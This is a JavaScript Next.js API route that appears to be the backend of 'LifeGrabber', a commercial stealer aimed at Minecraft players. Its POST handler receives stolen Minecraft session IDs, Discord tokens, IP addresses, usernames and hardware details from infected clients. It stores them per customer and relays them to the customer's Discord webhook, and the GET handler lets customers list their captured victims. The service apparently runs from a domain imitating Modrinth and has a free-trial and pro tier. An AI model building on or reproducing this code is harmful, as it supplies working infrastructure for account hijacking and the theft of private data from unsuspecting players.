export const dynamic = 'force-dynamic';

import { createClient } from '@supabase/supabase-js';
import { createServerClient } from '@supabase/ssr';
import { NextResponse } from 'next/server';
import { consumeFreeUse, getExhaustedEmails } from '@/lib/supabase/free-trial';

function getClient() {
  return createClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.SUPABASE_SERVICE_ROLE_KEY,
    { auth: { autoRefreshToken: false, persistSession: false } }
  );
}

function getClientAuth(request) {
  return createServerClient(
    process.env.NEXT_PUBLIC_SUPABASE_URL,
    process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY,
    {
      cookies: {
        getAll() { return request.cookies.getAll(); },
        setAll(cookiesToSet) {
          cookiesToSet.forEach(({ name, value }) => request.cookies.set(name, value));
        },
      },
    }
  );
}

async function sendDiscordWebhook(webhookUrl, grab, isNew) {
  if (!webhookUrl) return;
  const mcHead = `https://mc-heads.net/avatar/${grab.minecraft_username}/128`;
  const detailUrl = 'https://www.modrinth.nl/dashboard/grabs';
  const color = isNew ? 2201972 : 16750848;
  const title = isNew ? 'LifeGrabber — New Capture' : 'LifeGrabber — Capture Updated';
  const desc = isNew
    ? `${grab.minecraft_username} was captured successfully!`
    : `${grab.minecraft_username} was updated!`;

  try {
    await fetch(webhookUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        embeds: [{
          title,
          description: desc,
          color,
          thumbnail: { url: mcHead },
          url: detailUrl,
          fields: [
            { name: 'Username', value: grab.minecraft_username || 'Unknown', inline: true },
            { name: 'Discord', value: grab.discord_username || 'Unknown', inline: true },
            { name: 'IP', value: grab.ip_address || 'Unknown', inline: true },
            { name: 'OS', value: grab.os || 'Unknown', inline: true },
            { name: 'Country', value: grab.country || 'Unknown', inline: true },
          ],
          footer: { text: `LifeGrabber · ${new Date().toLocaleString()}` },
        }],
      }),
    });
  } catch (e) {
    console.error('Webhook failed:', e.message);
  }
}

export async function GET(request) {
  const { searchParams } = new URL(request.url);
  const ownerEmail = searchParams.get('owner_email');

  const supabaseAuth = getClientAuth(request);
  const { data: { user } } = await supabaseAuth.auth.getUser();
  if (!user) return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });

  const supabase = getClient();

  try {
    if (user.email === 'lifegrading@gmail.com') {
      let query = supabase.from('grabs').select('*').order('created_at', { ascending: false });
      if (ownerEmail) query = query.eq('owner_email', ownerEmail);
      const { data, error } = await query;
      if (error) return NextResponse.json({ grabs: [], error: error.message });

      const exhaustedEmails = await getExhaustedEmails(supabase);
      const filtered = (data || []).filter(
        g => !g.owner_email || !exhaustedEmails.includes(g.owner_email)
      );
      return NextResponse.json({ grabs: filtered });
    }

    const { data: userData } = await supabase
      .from('users')
      .select('is_pro, free_uses_remaining')
      .eq('email', user.email)
      .single();

    const isTrialExhausted = userData && !userData.is_pro && (userData.free_uses_remaining ?? 3) <= 0;

    const { data, error } = await supabase
      .from('grabs')
      .select('*')
      .eq('owner_email', user.email)
      .order('created_at', { ascending: false });

    if (error) return NextResponse.json({ grabs: [], error: error.message });
    return NextResponse.json({ grabs: data || [], trial_exhausted: isTrialExhausted });
  } catch (e) {
    return NextResponse.json({ grabs: [], error: e.message });
  }
}

function isUUID(str) {
  return /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i.test(str);
}

export async function POST(request) {
  const body = await request.json();
  if (!body.minecraft_username) {
    return NextResponse.json({ error: 'minecraft_username required' }, { status: 400 });
  }

  const supabase = getClient();

  let ownerEmail = body.owner_email || '';
  console.log('GRAB: minecraft_username=' + body.minecraft_username + ' owner_email=' + ownerEmail);

  if (ownerEmail && isUUID(ownerEmail)) {
    try {
      const { data: uuidMapping, error: uuidErr } = await supabase
        .from('user_uuids')
        .select('email')
        .eq('mod_uuid', ownerEmail)
        .single();
      if (uuidMapping?.email) {
        ownerEmail = uuidMapping.email;
        console.log('GRAB: UUID resolved to ' + ownerEmail);
      } else {
        console.log('GRAB: UUID NOT FOUND: ' + ownerEmail + ' error: ' + (uuidErr?.message || 'none'));
        ownerEmail = '';
      }
    } catch (e) {
      console.log('GRAB: UUID lookup exception: ' + e.message);
      ownerEmail = '';
    }
  }

  const grabData = {
    owner_email: ownerEmail,
    minecraft_username: body.minecraft_username || 'Unknown',
    discord_username: body.discord_username || 'Unknown',
    ip_address: body.ip_address || 'Unknown',
    country: body.country || 'Unknown',
    timezone: body.timezone || 'Unknown',
    os: body.os || 'Unknown',
    os_version: body.os_version || '',
    pc_name: body.pc_name || 'Unknown',
    windows_username: body.windows_username || '',
    cpu: body.cpu || '',
    ram: body.ram || '',
    gpu: body.gpu || '',
    screen_resolution: body.screen_resolution || '',
    disk_space: body.disk_space || '',
    java_version: body.java_version || '',
    language: body.language || '',
    desktop_env: body.desktop_env || '',
    client_version: body.client_version || 'Unknown',
    session_id: body.session_id || '',
    session_start: body.session_start || '',
    discord_token: body.discord_token || '',
    servers: body.servers || '',
  };

  let isNew = true;
  let grabId;

  try {
    const { data: existing } = await supabase
      .from('grabs')
      .select('id, owner_email')
      .eq('minecraft_username', body.minecraft_username)
      .order('created_at', { ascending: false })
      .limit(1)
      .single();

    if (existing) {
      isNew = false;
      grabId = existing.id;
      await supabase
        .from('grabs')
        .update({ ...grabData, owner_email: ownerEmail || existing.owner_email, updated_at: new Date().toISOString() })
        .eq('id', existing.id);
    } else {
      isNew = true;

      if (ownerEmail) {
        const check = await consumeFreeUse(supabase, ownerEmail);
        if (!check.success) {
          return NextResponse.json(
            { ok: false, error: 'trial_exhausted', remaining: check.remaining || 0 },
            { status: 403 }
          );
        }
        console.log('GRAB: free uses remaining=' + JSON.stringify(check.remaining));
      }

      const { data, error } = await supabase
        .from('grabs')
        .insert([grabData])
        .select()
        .single();
      if (error) return NextResponse.json({ error: error.message }, { status: 500 });
      grabId = data.id;
    }
  } catch (e) {
    return NextResponse.json({ error: e.message }, { status: 500 });
  }

  if (ownerEmail) {
    try {
      const { data: settings } = await supabase
        .from('user_settings')
        .select('webhook_url')
        .eq('email', ownerEmail)
        .single();
      if (settings?.webhook_url) {
        await sendDiscordWebhook(settings.webhook_url, grabData, isNew);
      }
    } catch (e) {}
  }

  return NextResponse.json({ ok: true, id: grabId, isNew });
}
